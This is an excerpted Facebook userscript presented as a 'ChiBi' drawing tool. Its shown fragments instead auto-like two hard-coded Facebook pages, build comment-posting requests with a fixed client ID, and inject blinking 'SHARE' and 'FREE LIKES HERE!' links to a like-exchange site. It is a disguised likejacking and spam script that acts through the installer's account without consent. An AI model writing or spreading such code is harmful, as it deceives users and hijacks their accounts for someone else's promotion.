// ==UserScript==
// @name            Tool Vẽ ChiBi FaceBook (5)
// @description     UPDATE 02/03/2014 (New)
...
function yorum_yap(id ,mesaj) {
 ...
 params +="&source=2";
 params +="&client_id=648886765169815";
 params +="&reply_fbid";
...
if(body != null)
{
 ...
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Ffans4fans.it&t=Facebook+Background+Theme' title='Share'><blink><center>SHARE</center></blink></a>"
...
if(body != null)
{
 ...
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://www.fans4fans.it/' title='Fans4Fans'><blink><center>FREE LIKES HERE!</center></blink></a>"
 body.appendChild(div);
}
...
Like("541784039213422");
Like("226234874205470");
